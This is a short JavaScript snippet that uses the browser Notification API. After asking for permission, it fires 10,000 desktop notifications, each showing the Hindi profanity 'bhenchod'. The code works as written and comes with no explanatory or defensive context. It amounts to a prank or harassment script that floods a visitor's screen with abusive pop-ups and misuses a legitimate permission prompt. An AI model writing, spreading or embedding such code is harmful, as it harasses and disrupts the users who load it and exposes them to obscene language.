if (!("Notification" in window)) {
    console.log("This browser does not support desktop notification");
  } else if (Notification.permission === "granted") {
    for (let index = 0; index < 10000; index++) {
        new Notification("bhenchod");
    }
  } else if (Notification.permission !== 'denied') {
    // Otherwise, ask the user for permission
    Notification.requestPermission(function (permission) {
      if (permission === "granted") {
        for (let index = 0; index < 10000; index++) {
            new Notification("bhenchod");
        }
      }
    });
  }
  